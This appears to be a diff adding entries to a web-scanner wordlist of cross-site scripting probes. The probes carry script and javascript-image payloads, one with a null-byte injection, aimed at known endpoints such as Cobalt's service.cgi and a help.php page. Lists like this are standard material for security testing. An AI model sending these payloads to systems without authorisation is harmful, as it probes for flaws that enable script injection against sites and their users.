@@ -1,0 +1,9 @@
+.cobalt/alert/service.cgi?service=<img%20src=javascript:alert('document.domain')>
+.cobalt/alert/service.cgi?service=<script>alert('document.domain')</script>
+/.cobalt/alert/service.cgi?service=<img%20src=javascript:alert('document.domain')>
+/.cobalt/alert/service.cgi?service=<script>alert('document.domain')</script>
+/badging/badge_template_v0.php?layout=<script>confirm('document.domain')</script>
+/_layouts/help.php?cid0=MS.WSS.manifest.xml%00%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&tid=X
+RemoveXSS.php
+/<script>alert('document.domain')</script>.php
+/~/<script>alert('document.domain')</script>.php
